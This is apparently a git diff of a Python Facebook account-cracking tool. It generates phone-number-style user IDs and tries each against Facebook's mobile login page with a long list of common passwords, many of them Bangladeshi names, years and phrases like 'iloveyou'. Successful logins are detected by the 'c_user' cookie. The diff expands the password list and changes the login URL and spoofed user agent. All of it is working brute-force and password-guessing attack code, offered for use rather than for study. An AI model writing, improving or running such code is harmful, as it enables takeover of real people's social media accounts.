@@ -154,7 +154,7 @@ def fuck():
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia123','sadiya','fuck you','fuckyou','sumaiya','fariya','jessore','khulna','nusrat jahan','password','jannatul']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia123','sadiya','fuck you','fuckyou','sumaiya','fariya','jessore','khulna','nusrat jahan','password','jannatul','barishal','shanto','mimmim','017017','0987654321','tiktok','321321','019019','016016','018018','khatun','mohammad','free fire game','pubg pubg','pubgpubg','pubg game','20232023','20222022','20212021','20202020','20192019','20182018','face book','facebook','20092009','sadia@','farjana','brishti','brishty','nabila','youtube','google','messenger','xvideo','xvideos','valobasi','habiba','fatema','Fatema','sultana','Sultana','Sharmin','sharmin','soniya','Soniya','Farjana','farjana','habiba','Habiba','samiya','Samiya','tamanna','Tamanna','Mimmim','nadiya','nafiza','Nadiya','Nafiza','Salman','salman','rakibul','Rakibul','20232023','Nayeem','nayeem','shohug','Shohug','rashel','Rashel','mafuza','Mafuza']
             yaari.submit(DEVHIS2,uid,pwx,tl)
     print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
@@ -170,9 +170,9 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] '%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] '%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.alpha.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -199,7 +199,7 @@ def DEVHIS2(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; fr-fr; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36 PHX/13.1',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 12; CPH2161 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',}
             lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
